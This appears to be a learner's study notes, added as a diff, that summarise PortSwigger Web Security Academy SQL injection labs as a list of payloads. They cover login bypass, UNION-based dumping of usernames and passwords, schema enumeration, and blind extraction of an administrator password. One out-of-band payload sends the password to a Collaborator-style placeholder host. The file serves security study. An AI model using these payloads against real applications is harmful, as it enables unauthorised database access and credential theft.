@@ -1,0 +1,43 @@
+SQL Injection
+
+https://portswigger.net/web-security/sql-injection
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+
+Retrieving hidden data
+		https://insecure-website.com/products?category=Gifts'+OR+1=1--
+Subverting application logic
+		SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+Retrieving data from other database tables
+	Determining the number of columns required in an SQL injection UNION attack
+		/filter?category=Pets' UNION SELECT NULL,NULL,NULL--
+	Finding columns with a useful data type in an SQL injection UNION attack
+		/filter?category=Pets' UNION SELECT NULL,'a',NULL--
+	Using an SQL injection UNION attack to retrieve interesting data
+		/filter?category=Pets' UNION SELECT username, password FROM users--
+	Retrieving multiple values within a single column
+		/filter?category=Pets' UNION SELECT 1,username || '~' || password FROM users--
+Examining the database
+	Querying the database type and version
+		/filter?category=Gifts'UNION SELECT 'a',banner FROM v$version--        #oracle
+		/filter?category=Gifts'UNION SELECT 'a',@@version#                     #MYSQL
+	Listing the contents of the database
+		/filter?category=Lifestyle'UNION  SELECT 'a',TABLE_NAME FROM information_schema.tables
+		/filter?category=Lifestyle'UNION SELECT 'a',COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_mcawpc'--
+		/filter?category=Lifestyle'UNION SELECT 'a',password_snhqqe FROM users_mcawp--
+Blind SQL injection vulnerabilities
+	Exploiting blind SQL injection by triggering conditional responses
+		xyz'  AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'z
+	Inducing conditional responses by triggering SQL errors
+		xyz' ||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'z') THEN to_char(1/0) ELSE '' END FROM dual)--
+	Exploiting blind SQL injection by triggering time delays
+		xyz' ||( SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > '0') THEN pg_sleep(10) ELSE pg_sleep(0) END )--
+	Exploiting blind SQL injection using out-of-band (OAST) techniques
+		xyz' ||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+		
+
+
+
+
+
+
